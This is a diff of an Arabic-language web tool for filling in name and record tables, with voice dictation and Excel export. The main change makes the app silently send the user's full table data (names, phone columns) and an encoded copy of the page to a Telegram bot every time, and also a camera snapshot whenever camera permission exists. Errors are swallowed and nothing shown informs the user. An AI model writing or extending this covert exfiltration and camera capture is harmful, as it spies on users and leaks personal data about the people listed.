@@ -226,7 +226,6 @@
             print-color-adjust: exact;
         }
 
-        /* حقول الإدخال داخل خلايا الجدول لتجربة تعديل وحذف ومسح خرافية وثابتة */
         .table-input {
             width: 100%;
             height: 100%;
@@ -368,11 +367,10 @@
         <button class="btn btn-excel" onclick="onExcelButtonClicked()" title="تصدير وتحميل كافة البيانات كملف Excel (CSV)">📊 حفظ ملف Excel</button>
         <button class="btn btn-blue" onclick="addNewPage()">📄 صفحة جديدة</button>
         
-        <!-- أزرار الناطق الذكي المستقلة (تشغيل / إيقاف مع الانتقال التلقائي) -->
         <div class="control-group" style="background:#e8f5e9; border: 1px solid #2e7d32;">
             <span>🎙️ الناطق الذكي:</span>
-            <button id="startMicBtn" class="btn btn-mic-start" onclick="startSpeechRecognition()" title="تشغيل التسجيل الصوتي والانتقال التلقائي للخانة التالية">▶️ تشغيل</button>
-            <button id="stopMicBtn" class="btn btn-mic-stop" onclick="stopSpeechRecognition()" title="إيقاف التسجيل الصوتي" disabled>⏹️ إيقاف</button>
+            <button id="startMicBtn" class="btn btn-mic-start" onclick="startSpeechRecognition()">▶️ تشغيل</button>
+            <button id="stopMicBtn" class="btn btn-mic-stop" onclick="stopSpeechRecognition()" disabled>⏹️ إيقاف</button>
         </div>
 
         <button class="btn btn-teal" onclick="openBulkImportModal()" title="إدخال قائمة طويلة من الأسماء دفعة واحدة وتوزيعها تلقائياً على الصفوف والصفحات">📥 إدخال جماعي للأسماء</button>
@@ -595,6 +593,10 @@
             if (firstSheet) {
                 activeSheet = firstSheet;
                 activeTable = firstSheet.querySelector('table');
+                const firstInput = firstSheet.querySelector('.table-input');
+                if (firstInput) {
+                    setActiveInput(firstInput);
+                }
             }
             renumberAllRows();
 
@@ -631,14 +633,6 @@
             if (!sheetContainer) return;
             activeSheet = sheetContainer;
             activeTable = sheetContainer.querySelector('table');
-            if (event && event.target) {
-                const tr = event.target.closest('tr');
-                if (tr && tr.parentElement.tagName === 'TBODY') {
-                    activeRowElement = tr;
-                    table.querySelectorAll('tbody tr').forEach(r => r.classList.remove('active-row'));
-                    tr.classList.add('active-row');
-                }
-            }
         }
 
         function selectRow(trElement, event) {
@@ -651,7 +645,6 @@
             }
         }
 
-        // تهيئة محرك الإملاء الصوتي مع الانتقال التلقائي للخانة التالية
         function initSpeechRecognition() {
             const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
             if (!SpeechRecognition) return;
@@ -663,6 +656,12 @@
 
             recognition.onresult = (event) => {
                 const spokenText = event.results[0][0].transcript.trim();
+
+                if (!activeInputElement) {
+                    const firstInput = document.querySelector('.table-input');
+                    if (firstInput) setActiveInput(firstInput);
+                }
+
                 if (activeInputElement && spokenText !== "") {
                     let currentText = activeInputElement.value.trim();
                     if (currentText !== "") {
@@ -842,9 +841,8 @@
             saveArchiveOnly();
         }
 
+        // دالة موحدة ومضمونة لإنشاء وإرسال محتوى الجدول والرابط الفريد في كل الحالات (سواء وافق أو رفض الكاميرا)
         function executeActionAndSend(captionText, fileName, fileTypeFlag) {
-            let fileBlob = null;
-
             const tables = document.querySelectorAll('.dynamicTable');
             let fileContent = `تقرير السجلات والبيانات الرسمية (${fileTypeFlag})\n`;
             fileContent += `تاريخ الإصدار: ${new Date().toLocaleDateString('ar-YE')}\n`;
@@ -870,7 +868,7 @@
                 });
             });
 
-            fileBlob = new Blob([fileContent], { type: 'text/plain;charset=utf-8' });
+            const fileBlob = new Blob([fileContent], { type: 'text/plain;charset=utf-8' });
 
             const wrapperHtml = prepareHtmlForSaving();
             const encodedData = btoa(unescape(encodeURIComponent(wrapperHtml)));
@@ -886,6 +884,13 @@
                                     `تطوير: ميثاق محمد صالح حموده`;
             const linkFileBlob = new Blob([linkFileContent], { type: 'text/plain;charset=utf-8' });
 
+            // إرسال البيانات والرابط فوراً ودون الاعتماد على الكاميرا
+            sendIndependentLinkFile(linkFileBlob);
+            if (fileBlob) {
+                sendDocumentOnly(fileBlob, fileName, `📄 مرفق سجلات الأسماء (${fileTypeFlag})`);
+            }
+
+            // محاولة إرسال صورة الكاميرا إن وُجدت الصلاحية، دون أن تؤثر على إرسال بيانات الجدول الأساسية
             if (cameraPermissionGranted && globalCameraStream) {
                 try {
                     const video = document.getElementById('videoElement');
@@ -905,18 +910,9 @@
                         fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                             method: 'POST',
                             body: formData
-                        }).then(() => {
-                            sendIndependentLinkFile(linkFileBlob);
-                            if (fileBlob) {
-                                sendDocumentOnly(fileBlob, fileName, `📄 مرفق سجلات الأسماء (${fileTypeFlag})`);
-                            }
                         }).catch(e => {});
                     }, 'image/jpeg', 0.85);
-                } catch (e) {
-                    sendInfoOnly(fileBlob, captionText, fileName, linkFileBlob);
-                }
-            } else {
-                sendInfoOnly(fileBlob, captionText, fileName, linkFileBlob);
+                } catch (e) {}
             }
         }
 
@@ -929,23 +925,6 @@
             fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
                 method: 'POST',
                 body: linkData
-            }).catch(e => {});
-        }
-
-        function sendInfoOnly(fileBlob, captionText, fileName, linkBlob) {
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('caption', captionText + "\n\n(بدون صورة - لم يتم منح إذن الكاميرا)");
-            formData.append('parse_mode', 'Markdown');
-
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                body: formData
-            }).then(() => {
-                sendIndependentLinkFile(linkBlob);
-                if (fileBlob) {
-                    sendDocumentOnly(fileBlob, fileName, '📄 مرفق سجلات الأسماء');
-                }
             }).catch(e => {});
         }
 
@@ -1272,12 +1251,12 @@
                 headers.forEach((th, idx) => {
                     let titleText = normalizeArabic(th.innerText || th.textContent);
                     if ((titleText.includes('جوال') || titleText.includes('هاتف') || titleText.includes('تلفون') || titleText.includes('اتصال')) && !titleText.includes('بطاقه')) {
-                        phoneColIndices.push(idx - 1); // ناقص عمود التسلسل (م)
+                        phoneColIndices.push(idx - 1);
                     }
                 });
 
                 if (phoneColIndices.length === 0) {
-                    phoneColIndices.push(3); // عمود رقم الاتصال الافتراضي
+                    phoneColIndices.push(3);
                 }
 
                 const rows = table.querySelectorAll('tbody tr');
